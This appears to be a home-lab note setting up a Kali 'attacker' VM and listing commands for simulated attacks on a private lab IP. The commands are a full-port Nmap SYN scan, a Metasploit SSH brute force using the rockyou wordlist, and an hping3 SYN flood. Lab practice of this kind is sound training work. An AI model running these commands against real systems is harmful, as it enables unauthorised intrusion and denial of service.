# Attacker VM Setup
## System Information
```
 Static hostname: red
       Icon name: computer-vm
         Chassis: vm 🖴
      Machine ID: 55e5305955694ed3b6c7506b1268fad8
         Boot ID: a760f2a946964c61b56878576de8fe30
    AF_VSOCK CID: 2998993014
  Virtualization: vmware
Operating System: Kali GNU/Linux Rolling
          Kernel: Linux 6.11.2-amd64
    Architecture: x86-64
 Hardware Vendor: VMware, Inc.
  Hardware Model: VMware Virtual Platform
Firmware Version: 6.00
   Firmware Date: Thu 2020-11-12
    Firmware Age: 4y 3month 1w 1d
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:c1:00:76 brd ff:ff:ff:ff:ff:ff
    inet 192.168.100.128/24 brd 192.168.100.255 scope global dynamic noprefixroute eth0
       valid_lft 1657sec preferred_lft 1657sec
    inet6 fe80::13e:bcaf:45e:4fa5/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```
## Installing Nmap, Metasploit, and hping3
```bash
sudo apt install -y nmap metasploit-framework hping3
```
## Simulating Attacks
### Port Scanning with Nmap
```bash
nmap -sS -p- 192.168.22.136
```
### Brute Force SSH with Metasploit
```bash
msfconsole -q
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.22.136
set USERPASS_FILE /usr/share/wordlists/rockyou.txt
run
```
### DoS Attack with hping3
```bash
hping3 -S --flood -p 80 192.168.22.136
```
